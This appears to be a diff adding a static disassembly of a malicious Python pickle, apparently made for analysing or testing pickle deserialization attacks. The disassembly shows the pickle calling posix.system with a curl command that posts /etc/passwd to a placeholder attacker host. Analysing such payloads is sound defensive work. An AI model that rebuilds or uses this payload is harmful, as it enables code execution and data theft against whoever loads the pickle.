@@ -1,0 +1,17 @@
+=== static disassembly (safe, nothing executes) ===
+    0: \x80 PROTO      4
+    2: \x95 FRAME      90
+   11: \x8c SHORT_BINUNICODE 'posix'
+   18: \x94 MEMOIZE    (as 0)
+   19: \x8c SHORT_BINUNICODE 'system'
+   27: \x94 MEMOIZE    (as 1)
+   28: \x93 STACK_GLOBAL
+   29: \x94 MEMOIZE    (as 2)
+   30: \x8c SHORT_BINUNICODE 'curl -X POST https://attacker.example.com/exfil -d @/etc/passwd'
+   95: \x94 MEMOIZE    (as 3)
+   96: \x85 TUPLE1
+   97: \x94 MEMOIZE    (as 4)
+   98: R    REDUCE
+   99: \x94 MEMOIZE    (as 5)
+  100: .    STOP
+highest protocol among opcodes = 4
